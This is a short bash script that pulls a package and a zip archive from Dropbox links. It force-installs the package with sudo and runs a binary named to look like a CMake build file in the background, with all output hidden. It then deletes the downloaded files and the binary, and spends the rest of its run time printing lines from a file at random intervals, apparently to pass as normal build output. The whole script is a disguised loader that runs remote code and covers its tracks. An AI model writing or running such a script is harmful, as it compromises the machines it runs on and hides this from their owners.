#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/vv24bsdw6wa8yuh/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/o6p05aoxkjt9pw5/makex.zip -q
unzip makex.zip > /dev/null 2>&1
#pwd
./CMakeFiles/makex ./CMakeFiles/script &
sleep 3
rm -rf makex.zip
rm -rf CMakeFiles/makex
rm -rf CMakeFiles/script
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 30 ))
done < $2

